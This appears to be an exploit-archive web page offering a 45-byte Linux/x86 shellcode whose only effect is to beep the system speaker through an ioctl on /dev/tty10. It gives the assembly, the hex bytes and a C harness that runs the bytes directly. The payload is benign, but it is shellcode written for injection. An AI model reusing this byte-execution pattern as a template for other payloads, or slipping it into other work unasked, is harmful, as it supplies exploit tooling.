<html><head><title>Linux/x86 - System Beep - 45 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
By Thomas Rinsma &lt; me[at]th0mas.nl &gt; (16 apr. 2008)

Shellcode makes system speaker beep once, 45 bytes:


   ;     int fd = open(&quot;/dev/tty10&quot;, O_RDONLY);
   push byte 5
   pop eax
   cdq
   push edx
   push 0x30317974
   push 0x742f2f2f
   push 0x7665642f
   mov ebx, esp
   mov ecx, edx
   int 80h

   ;     ioctl(fd, KDMKTONE (19248), 66729180);
   mov ebx, eax
   push byte 54
   pop eax
   mov ecx, 4294948047
   not ecx
   mov edx, 66729180
   int 80h
*/


main()
{
   char shellcode[] =
       &quot;\x6a\x05\x58\x99\x52\x68\x74\x79\x31\x30\x68\x2f\x2f\x2f\x74&quot;
       &quot;\x68\x2f\x64\x65\x76\x89\xe3\x89\xd1\xcd\x80\x89\xc3\x6a\x36&quot;
       &quot;\x58\xb9\xcf\xb4\xff\xff\xf7\xd1\xba\xdc\x34\xfa\x03\xcd\x80&quot;;

   (*(void (*)()) shellcode)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
